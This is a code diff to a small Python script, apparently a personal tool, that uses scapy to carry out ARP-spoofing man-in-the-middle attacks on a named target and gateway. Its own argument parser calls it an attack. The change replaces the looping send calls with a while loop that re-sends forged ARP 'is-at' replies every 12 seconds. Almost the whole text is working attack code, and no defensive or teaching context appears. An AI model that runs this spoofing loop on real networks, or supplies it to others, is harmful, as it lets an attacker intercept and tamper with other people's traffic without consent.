@@ -1,6 +1,7 @@
 import argparse
 import scapy.all as scapy
 import socket
+import time
 
 parser = argparse.ArgumentParser(description='Launch a man in the midle attack.')
 parser.add_argument('target', help='The IP address of the target')
@@ -20,6 +21,7 @@ def getMacAddress(host):
     arp_packet = scapy.ARP(hwdst="ff:ff:ff:ff:ff:ff", psrc=my_ip, pdst=host)
     arp_response = scapy.sr1(arp_packet)
     return arp_response.hwsrc
-
-scapy.send(scapy.ARP(op="is-at", psrc=args.gateway, pdst=args.target, hwdst=getMacAddress(args.target)), loop=1, inter=12)
-scapy.send(scapy.ARP(op="is-at", psrc=args.target, pdst=args.gateway, hwdst=getMacAddress(args.gateway)), loop=1, inter=12)
+while 1:
+    scapy.send(scapy.ARP(op="is-at", psrc=args.gateway, pdst=args.target, hwdst=getMacAddress(args.target)))
+    scapy.send(scapy.ARP(op="is-at", psrc=args.target, pdst=args.gateway, hwdst=getMacAddress(args.gateway)))
+    time.sleep(12)
